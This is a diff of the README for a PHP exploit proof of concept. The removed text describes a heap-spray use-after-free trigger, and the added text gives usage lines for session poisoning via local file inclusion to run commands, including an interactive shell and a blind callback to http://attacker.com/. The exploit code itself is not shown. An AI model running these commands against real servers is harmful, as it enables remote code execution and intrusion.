@@ -1,16 +1,18 @@
-This is the poc for 20 oct's exploit
-
+Usage
 ```
-php2shell_poc.py [OPTIONS]
+python3 poc.py <url> <command> [OPTIONS]
 
-  -t HOST   Target host (default: 127.0.0.1)
-  -p PORT   Target port (default: 19268)
-  -s SEC    Stall duration in seconds; must be > min_freq (default: 1.5)
-  -r N      Number of trigger rounds (default: 1)
-  -m        Monitor mode — read session mid-stall to confirm arming
-  --spray N Heap spray: N dummy 256-byte file parts to exhaust the ZendMM
-            bin before arData is freed, raising the probability that the
-            stale write hits a live zend_string (type confusion → crash)
-  -v        Verbose
-  --verify  Verify lab configuration before triggering
+# Session poison + auto-detected LFI
+python3 poc.py http://target.example.com/index.php "id"
+
+# Specify LFI parameter
+python3 poc.py http://target.example.com/ "id" --lfi-param page
+
+# Interactive shell
+python3 poc.py http://target.example.com/ "id" -i
+
+# Blind callback (no LFI needed on target side)
+python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
 ```
+
+Writeup coming soon
